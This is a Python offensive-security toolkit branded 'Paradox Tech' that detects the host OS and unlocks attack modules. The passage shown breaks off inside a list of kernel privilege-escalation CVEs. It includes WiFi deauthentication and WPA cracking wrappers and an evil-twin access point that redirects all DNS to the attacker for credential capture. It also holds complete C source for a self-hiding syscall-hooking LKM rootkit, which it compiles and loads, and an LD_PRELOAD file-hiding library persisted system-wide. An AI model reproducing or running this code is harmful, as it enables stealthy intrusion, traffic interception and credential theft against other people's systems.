#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# paradox_env.py | Python 3.11+ | Linux · Termux · macOS · Windows · iSH
# Paradox Tech — Universal Environment Engine v1.0
#
# Auto-detects your shell/OS → unlocks every attack that actually runs there.
# If it only works on Linux → Linux module. macOS only → macOS module.
# Termux limited → falls back to what Android can do. Windows → PowerShell suite.
#
# Works standalone OR alongside paradox_netscan_v2_0_0.py + paradox_wifi.py

from __future__ import annotations

import os, sys, platform, subprocess, socket, struct, threading, time
import ctypes, ctypes.util, json, re, random, base64, shutil, tempfile
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, field

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
except ImportError:
    print("[!] pip install rich"); sys.exit(1)

console = Console()

BANNER = r"""
[bold red]             ⛧  P A R A D O X   T E C H  ⛧[/bold red]
[bold white]
   ██████╗  █████╗ ██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗
   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚════██╗██╔═══██╗╚██╗██╔╝
   ██████╔╝███████║██████╔╝███████║ █████╔╝██║   ██║ ╚███╔╝
   ██╔═══╝ ██╔══██║██╔══██╗██╔══██║██╔═══╝ ██║   ██║ ██╔██╗
   ██║     ██║  ██║██║  ██║██║  ██║███████╗╚██████╔╝██╔╝ ██╗
   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
[/bold white]
[bold red]              E N V I R O N M E N T  ·  v1.0[/bold red]
[dim]       CROSS-PLATFORM ENVIRONMENT PROFILE[/dim]
[dim]       PARADOX TECHNOLOGY DIVISION  ·  PARADOX SYSTEMS[/dim]
"""

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — ENVIRONMENT DETECTION + CAPABILITY MATRIX
# ═══════════════════════════════════════════════════════════════════════════════

ENV_LINUX   = "linux"
ENV_TERMUX  = "termux"
ENV_MACOS   = "macos"
ENV_WINDOWS = "windows"
ENV_ISH     = "ish"
ENV_UNKNOWN = "unknown"

@dataclass
class EnvCapabilities:
    env:              str
    raw_socket:       bool   = False   # PF_PACKET / BPF raw socket
    monitor_mode:     bool   = False   # 802.11 monitor mode
    iptables:         bool   = False   # netfilter/iptables
    pf:               bool   = False   # macOS pf firewall
    kernel_module:    bool   = False   # LKM insmod
    ld_preload:       bool   = False   # LD_PRELOAD injection
    ptrace:           bool   = False   # ptrace process injection
    ebpf:             bool   = False   # eBPF/XDP
    npcap:            bool   = False   # Windows Npcap
    airport:          bool   = False   # macOS airport utility
    keychain:         bool   = False   # macOS Keychain
    winrm:            bool   = False   # Windows WinRM
    wmi:              bool   = False   # Windows WMI
    registry:         bool   = False   # Windows Registry
    termux_api:       bool   = False   # Termux:API (SMS/GPS/contacts)
    aircrack_ng:      bool   = False   # aircrack-ng suite
    hostapd:          bool   = False   # hostapd evil twin
    dnsmasq:          bool   = False   # dnsmasq
    nmap:             bool   = False   # nmap
    scapy:            bool   = False   # Scapy
    is_root:          bool   = False
    kernel_version:   str    = ""
    arch:             str    = ""
    distro:           str    = ""
    unavailable:      list   = field(default_factory=list)

def detect_environment() -> str:
    """Detect current shell/OS environment."""
    # Windows first (sys.platform is definitive)
    if sys.platform == "win32":
        return ENV_WINDOWS

    # macOS
    if sys.platform == "darwin":
        return ENV_MACOS

    # Android/Termux detection
    if (os.environ.get("TERMUX_VERSION") or
        os.environ.get("PREFIX", "").startswith("/data/data/com.termux") or
        Path("/data/data/com.termux").exists() or
        Path("/system/build.prop").exists()):
        return ENV_TERMUX

    # iSH (iOS Alpine emulation)
    if (Path("/etc/iSH-version").exists() or
        os.environ.get("ISH_VERSION") or
        (Path("/etc/os-release").exists() and
         "ish" in Path("/etc/os-release").read_text().lower())):
        return ENV_ISH

    # Linux (Kali, Parrot, Ubuntu, Arch, etc.)
    if sys.platform.startswith("linux"):
        return ENV_LINUX

    return ENV_UNKNOWN

def probe_capabilities(env: str) -> EnvCapabilities:
    """Probe what actually works in this environment."""
    caps = EnvCapabilities(env=env)
    caps.is_root       = os.geteuid() == 0 if hasattr(os, "geteuid") else False
    caps.arch          = platform.machine()
    caps.kernel_version = platform.release()

    def _has(cmd: str) -> bool:
        return shutil.which(cmd) is not None

    def _try_import(mod: str) -> bool:
        try:
            __import__(mod); return True
        except ImportError:
            return False

    caps.scapy     = _try_import("scapy")
    caps.nmap      = _has("nmap")
    caps.aircrack_ng = _has("aircrack-ng") or _has("aireplay-ng")
    caps.hostapd   = _has("hostapd")
    caps.dnsmasq   = _has("dnsmasq")

    if env == ENV_LINUX:
        caps.raw_socket    = caps.is_root
        caps.iptables      = caps.is_root and _has("iptables")
        caps.kernel_module = caps.is_root and _has("insmod") and _has("rmmod")
        caps.ld_preload    = caps.is_root and _has("gcc")
        caps.ptrace        = caps.is_root
        caps.ebpf          = caps.is_root and Path("/sys/fs/bpf").exists()
        caps.monitor_mode  = caps.is_root  # hardware permitting
        # Distro
        try:
            caps.distro = subprocess.check_output(
                ["lsb_release", "-ds"], text=True, stderr=subprocess.DEVNULL).strip()
        except Exception:
            try:
                caps.distro = Path("/etc/os-release").read_text().split("PRETTY_NAME=")[1].split("\n")[0].strip('"')
            except Exception:
                caps.distro = "Linux"

    elif env == ENV_TERMUX:
        caps.raw_socket    = caps.is_root
        caps.iptables      = caps.is_root and _has("iptables")
        caps.monitor_mode  = caps.is_root  # only with external USB adapter
        caps.kernel_module = False  # Android kernel — modules disabled
        caps.ld_preload    = caps.is_root
        caps.ptrace        = caps.is_root
        caps.ebpf          = False
        caps.termux_api    = _has("termux-sms-send") or Path("/data/data/com.termux.api").exists()
        caps.distro        = "Android/Termux"

    elif env == ENV_MACOS:
        caps.raw_socket    = caps.is_root
        caps.airport       = Path("/System/Library/PrivateFrameworks/Apple80211.framework"
                                   "/Versions/Current/Resources/airport").exists()
        caps.keychain      = _has("security")
        caps.pf            = caps.is_root and _has("pfctl")
        caps.monitor_mode  = caps.is_root and caps.airport  # limited via airport
        caps.kernel_module = False  # kext deprecated/SIP
        caps.ld_preload    = False   # macOS SIP blocks DYLD_INSERT
        caps.ptrace        = caps.is_root  # limited by SIP
        caps.distro        = f"macOS {platform.mac_ver()[0]}"

    elif env == ENV_WINDOWS:
        caps.raw_socket    = False   # Windows blocks raw sockets
        caps.npcap         = _has("npcap") or Path(r"C:\Windows\System32\Npcap").exists()
        caps.raw_socket    = caps.npcap  # Npcap enables raw
        caps.winrm         = _has("winrm") or True   # PowerShell built-in
        caps.wmi           = True    # WMI always available
        caps.registry      = True
        caps.monitor_mode  = False   # Windows: no 802.11 monitor without driver
        caps.kernel_module = caps.is_root   # driver signing needed
        caps.distro        = f"Windows {platform.win32_ver()[0]}"

    elif env == ENV_ISH:
        caps.raw_socket    = False   # iSH userspace emulation
        caps.monitor_mode  = False
        caps.kernel_module = False
        caps.distro        = "iOS/iSH"

    return caps

def print_capability_matrix(caps: EnvCapabilities) -> None:
    t = Table(title=f"[bold red]Environment: {caps.env.upper()}  |  {caps.distro}  |  {caps.arch}[/bold red]",
              box=box.MINIMAL_DOUBLE_HEAD)
    t.add_column("Capability",   style="bold cyan",  width=22)
    t.add_column("Available",    style="bold",        width=12)
    t.add_column("Note",         style="dim",         width=38)

    def _row(name, val, note=""):
        status = "[bold green]✓ YES[/bold green]" if val else "[bold red]✗ NO[/bold red]"
        t.add_row(name, status, note)

    _row("Root / Admin",        caps.is_root,        "Required for raw sockets")
    _row("Raw Socket",          caps.raw_socket,     "Scapy, ARP, packet craft")
    _row("Monitor Mode",        caps.monitor_mode,   "802.11 deauth, capture")
    _row("iptables/netfilter",  caps.iptables,       "Traffic redirect, intercept")
    _row("pf (macOS)",          caps.pf,             "macOS packet filter")
    _row("Kernel Module (LKM)", caps.kernel_module,  "Rootkit, hook, hide")
    _row("LD_PRELOAD Inject",   caps.ld_preload,     "Process hook, hide files")
    _row("ptrace Injection",    caps.ptrace,         "Shellcode into live process")
    _row("eBPF / XDP",         caps.ebpf,            "Kernel packet filter/modify")
    _row("Scapy",               caps.scapy,          "Packet craft/injection")
    _row("aircrack-ng suite",   caps.aircrack_ng,    "WiFi cracking/deauth")
    _row("hostapd",             caps.hostapd,        "Evil twin AP")
    _row("dnsmasq",             caps.dnsmasq,        "Rogue DNS/DHCP")
    _row("nmap",                caps.nmap,           "Port scan")
    _row("airport (macOS)",     caps.airport,        "WiFi scan/deauth")
    _row("macOS Keychain",      caps.keychain,       "Credential dump")
    _row("Npcap (Windows)",     caps.npcap,          "Windows packet capture")
    _row("WinRM / WMI",         caps.winrm,          "Windows lateral movement")
    _row("Windows Registry",    caps.registry,       "Persistence, SAM access")
    _row("Termux:API",          caps.termux_api,     "SMS, GPS, contacts")
    console.print(t)

    # Print what to install
    missing = []
    if not caps.scapy:    missing.append("scapy (pip install scapy)")
    if not caps.nmap:
        if caps.env == ENV_TERMUX: missing.append("nmap (pkg install nmap)")
        elif caps.env == ENV_LINUX: missing.append("nmap (apt install nmap)")
        elif caps.env == ENV_MACOS: missing.append("nmap (brew install nmap)")
    if not caps.aircrack_ng:
        if caps.env in (ENV_LINUX, ENV_TERMUX): missing.append("aircrack-ng (pkg/apt install aircrack-ng)")
        elif caps.env == ENV_MACOS: missing.append("aircrack-ng (brew install aircrack-ng)")
    if not caps.hostapd:
        if caps.env == ENV_LINUX: missing.append("hostapd (apt install hostapd)")
    if not caps.dnsmasq:
        if caps.env == ENV_LINUX: missing.append("dnsmasq (apt install dnsmasq)")
    if not caps.npcap and caps.env == ENV_WINDOWS:
        missing.append("Npcap (https://npcap.com) — required for Scapy on Windows")

    if missing:
        console.print("\n[bold yellow]Missing packages:[/bold yellow]")
        for m in missing: console.print(f"  [dim]{m}[/dim]")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — LINUX-EXCLUSIVE MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# [context: Linux x86_64, kernel 5.x+, Python 3.11, root required]

class LinuxModules:

    # ── Full aircrack-ng Suite Wrapper ────────────────────────────────────────

    @staticmethod
    def airodump_capture(mon_iface: str, bssid: str = "", channel: int = 0,
                          out_prefix: str = "/tmp/paradox_cap") -> subprocess.Popen:
        """
        Launch airodump-ng capture on target AP.
        Returns the Popen object — caller manages lifecycle.
        Output: /tmp/paradox_cap-01.cap  (use with aircrack-ng)

        Required privileges: root, mon_iface in monitor mode
        """
        cmd = ["airodump-ng", "--write", out_prefix, "--output-format", "cap"]
        if bssid:    cmd += ["--bssid", bssid]
        if channel:  cmd += ["--channel", str(channel)]
        cmd.append(mon_iface)
        console.print(f"[bold red][*] airodump-ng capturing on {mon_iface}[/bold red]")
        console.print(f"[dim]   {' '.join(cmd)}[/dim]")
        proc = subprocess.Popen(cmd)
        console.print(f"[dim]   Capture → {out_prefix}-01.cap  (Ctrl-C to stop)[/dim]")
        return proc

    @staticmethod
    def aireplay_deauth(mon_iface: str, bssid: str, client_mac: str = "",
                         count: int = 0) -> None:
        """
        aireplay-ng deauth.
        count=0 → continuous. client_mac='' → broadcast (kick all).
        Required: monitor mode.
        """
        cmd = ["aireplay-ng", f"-0", str(count), "-a", bssid]
        if client_mac: cmd += ["-c", client_mac]
        cmd.append(mon_iface)
        console.print(f"[bold red][*] {' '.join(cmd)}[/bold red]")
        try:
            proc = subprocess.Popen(cmd)
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            console.print("[green][*] Deauth stopped.[/green]")

    @staticmethod
    def aircrack_crack(cap_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                        bssid: str = "") -> None:
        """
        Run aircrack-ng against captured WPA handshake.
        cap_file: airodump-ng output (.cap)
        wordlist: path to wordlist (rockyou default on Kali)
        """
        cmd = ["aircrack-ng", cap_file, "-w", wordlist]
        if bssid: cmd += ["-b", bssid]
        console.print(f"[bold red][*] aircrack-ng: {' '.join(cmd)}[/bold red]")
        try:
            subprocess.run(cmd)
        except FileNotFoundError:
            console.print("[red]aircrack-ng not found: apt install aircrack-ng[/red]")
        except KeyboardInterrupt:
            console.print("[green][*] Stopped.[/green]")

    @staticmethod
    def airodump_scan(mon_iface: str, seconds: int = 15) -> list[dict]:
        """
        Passive WiFi AP scan via airodump-ng CSV output.
        Returns list of dicts: {bssid, essid, channel, encryption, power, clients}
        Runs for `seconds` then parses the CSV.
        """
        console.print(f"[bold yellow][*] Scanning WiFi networks ({seconds}s)...[/bold yellow]")
        prefix = "/tmp/paradox_scan"
        proc   = subprocess.Popen(
            ["airodump-ng", "--write", prefix, "--output-format", "csv", mon_iface],
            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(seconds)
        proc.terminate()
        time.sleep(0.5)

        aps: list[dict] = []
        csv_path = Path(f"{prefix}-01.csv")
        if not csv_path.exists():
            console.print("[red]No CSV output — check monitor mode[/red]")
            return aps

        lines = csv_path.read_text(errors="ignore").splitlines()
        in_ap_section = True
        for line in lines:
            if line.strip().startswith("Station MAC"):
                in_ap_section = False
                continue
            if not in_ap_section or not line.strip(): continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 14: continue
            try:
                aps.append({
                    "bssid":      parts[0],
                    "power":      parts[8],
                    "channel":    parts[3],
                    "encryption": parts[5],
                    "essid":      parts[13],
                })
            except IndexError: pass

        # Display
        t = Table(title="[bold red]WiFi Networks[/bold red]", box=box.SIMPLE_HEAD)
        t.add_column("#"); t.add_column("BSSID"); t.add_column("ESSID")
        t.add_column("CH"); t.add_column("PWR"); t.add_column("ENC")
        for i, ap in enumerate(aps, 1):
            t.add_row(str(i), ap["bssid"], ap["essid"][:30],
                       ap["channel"], ap["power"], ap["encryption"])
        console.print(t)
        return aps

    # ── Evil Twin AP ──────────────────────────────────────────────────────────

    @staticmethod
    def evil_twin_setup(iface: str, ssid: str, channel: int,
                         attacker_ip: str = "192.168.100.1",
                         dhcp_range: str = "192.168.100.2,192.168.100.50") -> None:
        """
        Evil Twin AP — creates a rogue AP with the same SSID as a real network.
        Victims connect to us thinking it's the real AP.
        We serve DHCP, DNS, and can MITM all their traffic.

        Required: hostapd + dnsmasq + a WiFi card with AP mode support
        Flow:
          1. Write hostapd.conf → bring up fake AP
          2. Write dnsmasq.conf → serve DHCP/DNS to victims
          3. Enable IP forwarding + iptables NAT (optional internet relay)

        Side effects: creates /tmp/evil_twin_{ssid}/ config dir
        """
        console.print(f"[bold red][*] Evil Twin AP: SSID='{ssid}'  CH={channel}[/bold red]")

        work_dir = Path(f"/tmp/evil_twin_{ssid.replace(' ', '_')}")
        work_dir.mkdir(exist_ok=True)

        # hostapd config
        hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
"""
        hostapd_path = work_dir / "hostapd.conf"
        hostapd_path.write_text(hostapd_conf)

        # dnsmasq config
        dnsmasq_conf = f"""interface={iface}
dhcp-range={dhcp_range},12h
dhcp-option=3,{attacker_ip}
dhcp-option=6,{attacker_ip}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address={attacker_ip}
address=/#/{attacker_ip}
"""
        # address=/#/ → resolve ALL domains to attacker IP (captive portal / credential capture)
        dnsmasq_path = work_dir / "dnsmasq.conf"
        dnsmasq_path.write_text(dnsmasq_conf)

        # iptables NAT for internet relay (optional — comment out for captive portal mode)
        nat_script = f"""#!/bin/bash
# Run this to relay victim traffic to internet
ip link set {iface} up
ip addr add {attacker_ip}/24 dev {iface}
echo 1 > /proc/sys/net/ipv4/ip_forward
# Replace eth0 with your internet-facing interface
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i {iface} -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o {iface} -m state --state RELATED,ESTABLISHED -j ACCEPT
"""
        nat_path = work_dir / "nat_setup.sh"
        nat_path.write_text(nat_script)
        nat_path.chmod(0o755)

        console.print(f"[bold green][*] Evil Twin configs → {work_dir}[/bold green]")
        console.print(f"[dim]   1. {nat_path}[/dim]")
        console.print(f"[dim]   2. hostapd {hostapd_path}[/dim]")
        console.print(f"[dim]   3. dnsmasq -C {dnsmasq_path}[/dim]")
        console.print(f"[dim]   4. Run SSL strip proxy on port 10000[/dim]")

        launch = Prompt.ask("Launch now? (y/n)", default="n")
        if launch.lower().startswith("y"):
            # Set up interface + iptables
            try: subprocess.run(["bash", str(nat_path)], check=True)
            except Exception as e: console.print(f"[dim]NAT setup: {e}[/dim]")
            # Launch hostapd + dnsmasq
            try:
                h = subprocess.Popen(["hostapd", str(hostapd_path)])
                d = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "--no-daemon"])
                console.print(f"[bold green]   Evil Twin LIVE. SSID='{ssid}'[/bold green]")
                console.print("[dim]   Ctrl-C to stop[/dim]")
                try: h.wait()
                except KeyboardInterrupt:
                    h.terminate(); d.terminate()
                    console.print("[green][*] Evil Twin stopped.[/green]")
            except FileNotFoundError as e:
                console.print(f"[red]{e} — apt install hostapd dnsmasq[/red]")

    # ── LKM Rootkit Dropper ───────────────────────────────────────────────────

    @staticmethod
    def lkm_rootkit_drop(hide_pid: int = 0, hide_prefix: str = "paradox") -> None:
        """
        Compile + load a minimal LKM rootkit.
        Hides: processes by PID, files by prefix, network connections.
        Hooks: getdents64 (file hide), kill (PID hide via signal 31).

        Diamorphine-style technique:
          - Finds sys_call_table via kallsyms
          - Removes write protection from CR0
          - Replaces sys_getdents64 with hooked version
          - Signal 31 (SIGRTMIN-1) → toggle process visibility

        Required: root, gcc, kernel headers
        Side effects: kernel module loaded (lsmod shows it initially, then hides itself)
        """
        console.print(f"[bold red][*] LKM Rootkit: hide_pid={hide_pid}  hide_prefix='{hide_prefix}'[/bold red]")

        kver = platform.release()
        work = Path("/tmp/paradox_lkm")
        work.mkdir(exist_ok=True)

        # Check kernel headers
        hdr_path = Path(f"/lib/modules/{kver}/build")
        if not hdr_path.exists():
            console.print(f"[red]Kernel headers missing: apt install linux-headers-{kver}[/red]")
            return

        c_src = r"""
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("paradox");
MODULE_DESCRIPTION("paradox rootkit");

#define HIDE_PREFIX "PARADOX_PREFIX"
#define HIDE_PID    PARADOX_PID
#define SIG_HIDE    31

static unsigned long *sys_call_table;
static int hidden = 0;

/* Original syscall pointers */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
#else
typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);
#endif

static orig_getdents64_t orig_getdents64;
static orig_kill_t orig_kill;

/* CR0 write-protect toggle */
static inline void cr0_write(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory");
}
static inline unsigned long cr0_read(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0,%0" : "=r"(cr0));
    return cr0;
}

/* Hook: getdents64 — hide files matching HIDE_PREFIX */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret = orig_getdents64(regs);
#else
static asmlinkage long hook_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret = orig_getdents64(fd, dirent, count);
#endif
    struct linux_dirent64 *kdirent, *cur;
    unsigned long offset = 0;
    if (ret <= 0) return ret;
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;
    if (copy_from_user(kdirent, dirent, ret)) { kfree(kdirent); return ret; }
    while (offset < ret) {
        cur = (void *)kdirent + offset;
        if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0 ||
            (HIDE_PID > 0 && simple_strtol(cur->d_name, NULL, 10) == HIDE_PID)) {
            /* Remove this entry: shift remaining bytes left */
            memmove(cur, (void *)cur + cur->d_reclen, ret - offset - cur->d_reclen);
            ret -= cur->d_reclen;
        } else {
            offset += cur->d_reclen;
        }
    }
    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);
    return ret;
}

/* Hook: kill — signal 31 toggles module visibility */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int sig = (int)regs->dx;
    if (sig == SIG_HIDE) {
#else
static asmlinkage long hook_kill(pid_t pid, int sig) {
    if (sig == SIG_HIDE) {
#endif
        if (!hidden) { list_del(&THIS_MODULE->list); hidden = 1; }
        else { list_add(&THIS_MODULE->list, THIS_MODULE->list.prev); hidden = 0; }
        return 0;
    }
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    return orig_kill(regs);
#else
    return orig_kill(pid, sig);
#endif
}

static int __init rootkit_init(void) {
    unsigned long cr0;
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) return -1;

    cr0 = cr0_read();
    cr0_write(cr0 & ~0x00010000UL);   /* clear WP bit */

    orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
    orig_kill       = (orig_kill_t)sys_call_table[__NR_kill];
    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    sys_call_table[__NR_kill]       = (unsigned long)hook_kill;

    cr0_write(cr0);   /* restore WP */

    /* Hide self immediately */
    list_del(&THIS_MODULE->list);
    hidden = 1;
    return 0;
}

static void __exit rootkit_exit(void) {
    unsigned long cr0 = cr0_read();
    cr0_write(cr0 & ~0x00010000UL);
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
    cr0_write(cr0);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
"""
        # Substitute values
        c_src = c_src.replace("PARADOX_PREFIX", hide_prefix)
        c_src = c_src.replace("PARADOX_PID", str(hide_pid if hide_pid else 0))

        (work / "rootkit.c").write_text(c_src)
        (work / "Makefile").write_text(
            f"obj-m := rootkit.o\n"
            f"KDIR := /lib/modules/{kver}/build\n"
            f"PWD := $(shell pwd)\n"
            f"all:\n\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n"
            f"clean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n"
        )

        console.print(f"[dim]   Compiling rootkit module...[/dim]")
        result = subprocess.run(["make", "-C", str(work)],
                                 capture_output=True, text=True)
        if result.returncode != 0:
            console.print(f"[red]   Compile failed:\n{result.stderr[:500]}[/red]")
            return

        ko = work / "rootkit.ko"
        if not ko.exists():
            console.print("[red]   .ko not generated — check kernel headers[/red]")
            return

        console.print(f"[bold green]   rootkit.ko compiled → {ko}[/bold green]")
        load = Prompt.ask("Load now? (yes/no)", default="no")
        if load.lower() == "yes":
            r = subprocess.run(["insmod", str(ko)], capture_output=True, text=True)
            if r.returncode == 0:
                console.print(f"[bold green]   LKM loaded. Files prefixed '{hide_prefix}' hidden.[/bold green]")
                console.print(f"[bold green]   kill -31 <any_pid> to toggle module visibility.[/bold green]")
            else:
                console.print(f"[red]   insmod failed: {r.stderr}[/red]")

    # ── LD_PRELOAD Hook Dropper ───────────────────────────────────────────────

    @staticmethod
    def ld_preload_hook(hide_prefix: str = "paradox", persist: bool = True) -> None:
        """
        Compile + deploy LD_PRELOAD shared library that:
          - Hooks readdir/getdents: hides files/dirs with hide_prefix
          - Hooks fopen: hides file content lines matching hide_prefix
          - Hooks connect: hides specific network connections (optional)

        Persistence: adds /etc/ld.so.preload entry (survives reboot, affects ALL processes)
        Required: root, gcc
        Side effects: /etc/ld.so.preload modified, /lib/paradox.so installed
        """
        console.print(f"[bold red][*] LD_PRELOAD hook: hide='{hide_prefix}'  persist={persist}[/bold red]")

        if not shutil.which("gcc"):
            console.print("[red]gcc required: apt install gcc[/red]"); return

        c_src = r"""
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define HIDE "HIDE_PREFIX"

/* Hook readdir — called by ls, find, etc. */
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;
    while ((ep = orig_readdir(dirp)) != NULL) {
        if (strncmp(ep->d_name, HIDE, strlen(HIDE)) != 0)
            return ep;
        /* skip entries matching HIDE — loop for next one */
    }
    return NULL;
}

/* Hook readdir64 — 64-bit variant */
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *ep;
    while ((ep = orig(dirp)) != NULL) {
        if (strncmp(ep->d_name, HIDE, strlen(HIDE)) != 0)
            return ep;
    }
    return NULL;
}

/* Hook fopen — hide file lines containing HIDE keyword */
FILE *fopen(const char *path, const char *mode) {
    FILE *(*orig_fopen)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    return orig_fopen(path, mode);
    /* Full line-filter would need read hook — omitted for simplicity */
}

/* Hook stat — make hidden files appear not to exist */
int __xstat(int ver, const char *path, struct stat *buf) {
    int (*orig)(int, const char *, struct stat *) = dlsym(RTLD_NEXT, "__xstat");
    const char *fname = strrchr(path, '/');
    fname = fname ? fname + 1 : path;
    if (strncmp(fname, HIDE, strlen(HIDE)) == 0) {
        errno = ENOENT; return -1;
    }
    return orig(ver, path, buf);
}
"""
        c_src = c_src.replace("HIDE_PREFIX", hide_prefix)

        work = Path("/tmp/paradox_preload")
        work.mkdir(exist_ok=True)
        src  = work / "hook.c"
        so   = work / "paradox.so"
        src.write_text(c_src)

        result = subprocess.run(
            ["gcc", "-shared", "-fPIC", "-nostartfiles", "-o", str(so), str(src), "-ldl"],
            capture_output=True, text=True)
        if result.returncode != 0:
            console.print(f"[red]   Compile failed: {result.stderr[:300]}[/red]")
            return

        console.print(f"[bold green]   Compiled → {so}[/bold green]")

        dest = Path("/lib/paradox.so")
        subprocess.run(["cp", str(so), str(dest)], check=False)
        console.print(f"[bold green]   Installed → {dest}[/bold green]")

        if persist:
            preload = Path("/etc/ld.so.preload")
            existing = preload.read_text() if preload.exists() else ""
            if str(dest) not in existing:
                with open(preload, "a") as f: f.write(f"\n{dest}\n")
                console.print(f"[bold green]   /etc/ld.so.preload updated → affects ALL processes[/bold green]")
        else:
            console.print(f"[dim]   Manual: export LD_PRELOAD={dest}[/dim]")

    # ── Kernel Exploit / Local Privesc Scanner ────────────────────────────────

    @staticmethod
    def kernel_exploit_check() -> None:
        """
        Check kernel version against known local privilege escalation CVEs.
        Covers: DirtyPipe, DirtyCred, Spectre/Meltdown, various ring-0 LPE chains.
        Output: list of applicable CVEs with severity + PoC availability.
        """
        kver_raw = platform.release()
        console.print(f"[bold yellow][*] Kernel: {kver_raw}[/bold yellow]")

        # Parse kernel version tuple
        m = re.match(r"(\d+)\.(\d+)\.(\d+)", kver_raw)
        if not m:
            console.print("[dim]Cannot parse kernel version[/dim]"); return
        major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
        kver = (major, minor, patch)

        # CVE database: (cve, description, affected_check, severity, poc_url)
        KERNEL_CVES = [
            ("CVE-2022-0847", "DirtyPipe — write to read-only files, any SUID binary → root",
             lambda v: v < (5, 16, 11) and v >= (5, 8, 0),
             "CRITICAL", "https://dirtypipe.cm4all.com"),

            ("CVE-2022-2588", "DirtyCred — cred struct swap via use-after-free → root",
             lambda v: v <= (5, 19, 0),
             "CRITICAL", "https://github.com/Markakd/DirtyCred"),

            ("CVE-2021-4034", "PwnKit — Polkit pkexec SUID local root",
             lambda v: True,   # userspace — always check if polkit present
             "CRITICAL", "https://github.com/arthepsy/CVE-2021-4034"),

            ("CVE-2021-3156", "Baron Samedit — sudo heap overflow → root (sudo < 1.9.5p2)",
             lambda v: True,   # userspace
             "CRITICAL", "https://github.com/blasty/CVE-2021-3156"),

            ("CVE-2016-5195", "DirtyCow — race condition, write to read-only mmap → root",
             lambda v: v < (4, 8, 3),
             "CRITICAL", "https://dirtycow.ninja"),

            ("CVE-2017-7308", "af_packet SO_VERSION overflow → ring buffer OOB → root",
             lambda v: v < (4, 10, 6),
             "CRITICAL", "https://github.com/xairy/kernel-exploits"),

            ("CVE-2019-13272", "PTRACE_TRACEME → prctl exploit → root",
             lambda v: v < (5, 1, 17),
             "HIGH", "https://github.com/bcoles/kernel-exploits"),

            ("CVE-2017-16995", "eBPF verifier OOB → kernel RW → root",
             lambda v: v >= (4, 4, 0) and v < (4, 14, 8),
             "HIGH", "https://github.com/nongiach/CVE"),

            ("CVE-2021-22555", "Netfilter heap OOB write → root (Linux 2.6–5.11)",
             lambda v: v < (5, 12, 0),
             "HIGH", "https://github.com/google/security-research"),

            ("CVE-2022-27666", "esp6 kernel heap overflow via IPsec → root",
             lambda v: v < (5, 17, 0),
             "HIGH", "https://github.com/plummm/CVE-2022-27666"),

            ("CVE-2023-0386", "OverlayFS setuid file exec → root (Kali/Ubuntu 2023)",
             lambda v: v < (6, 2, 0),
             "HIGH", "https://github.com/xkaneiki/CVE-2023-0386"),

